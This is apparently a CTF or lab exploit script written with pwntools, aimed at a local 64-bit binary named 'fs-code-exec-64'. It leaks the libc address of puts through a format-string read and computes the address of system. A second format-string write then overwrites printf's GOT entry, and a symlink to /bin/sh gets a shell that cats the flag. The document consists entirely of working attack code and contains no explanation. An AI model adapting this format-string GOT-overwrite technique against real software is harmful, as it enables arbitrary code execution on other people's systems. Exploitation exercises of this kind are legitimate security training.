from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Requires a complex symlink from wierd chars to /bin/sh
if os.path.exists("Welcome"):
    os.remove("Welcome")
os.symlink("//bin/sh", "Welcome")
if os.path.exists("%s!"):
    os.remove("%s!")
f = open("%s!", "w")
f.write("cat flag")
f.close()


# This was for 64 bit dummy
system_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['system']
puts_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['puts']
offset = system_init_addr - puts_init_addr

# Addresses needed for the attack
got_puts_addr = 0x601020 # Address of the got entry
got_printf_addr = 0x601030 # Address of the got entry

read_inp = '%7$s\0\0\0\0\x20\x10\x60\0\0\0\0\0'

# Launch processs
p = process('./fs-code-exec-64', env=env)

print(p.recvline())
p.sendline(read_inp)
data = p.recvline()
print(data.split())
data = data.split()[1]
l1 = [data, '\0', '\0']
data = ''.join(l1)

puts_addr = u64(data)
print(hex(puts_addr))

system_addr = puts_addr + offset
print(hex(system_addr))

low = system_addr % 0x1000000
print(hex(low))

high = system_addr / 0x1000000
print(hex(high))

print(low)
print(high)
diff = high - low
print(diff)

write_inp = '%' + str(low) + 'x%10$n%' + str(diff) + 'x%11$n\0\0\0\0\x30\x10\x60\0\0\0\0\0\x33\x10\x60\0\0\0\0\0'
#write_inp = '\x10\xa0\x04\x08\x12\xa0\x04\x08\0\0\0\0%' + str(low-8) + 'x%7$n%' + str(diff) + 'x%8$n'
print(len(write_inp))
print(write_inp)
print(p.recvline())
p.sendline(write_inp)

p.interactive()
